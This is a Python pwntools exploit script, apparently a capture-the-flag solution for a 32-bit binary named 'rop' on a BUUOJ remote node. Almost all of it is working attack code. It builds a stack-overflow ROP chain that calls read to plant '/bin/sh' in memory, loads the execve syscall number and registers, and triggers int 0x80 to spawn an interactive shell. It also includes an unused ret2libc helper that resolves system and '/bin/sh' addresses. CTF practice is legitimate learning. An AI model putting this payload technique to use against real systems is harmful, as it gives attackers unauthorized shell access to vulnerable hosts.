from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)


context(os='linux', arch='i386', log_level='debug')
binary = './rop'

context.binary = binary
elf = ELF(binary)
io = remote('node4.buuoj.cn',29945) if argv[1]=='r' else process(binary)


int_addr = 0x0806c943
read_addr = 0x0806D290
bin_sh_addr = 0x080EAF80
#eax、ebx、ecx、edx
# 　int80(11,"/bin/sh",null,null)
pop_eax_ret = 0x080b8016
pop_edx_ecx_ebx_ret = 0x0806ed00

payload = b'a'* (0xc+4) + p32(read_addr) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(bin_sh_addr) + p32(0x8)
payload += p32(pop_eax_ret) + p32(11) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(bin_sh_addr) + p32(int_addr)

io.sendline(payload)
io.send(b'/bin/sh\x00')
io.interactive()

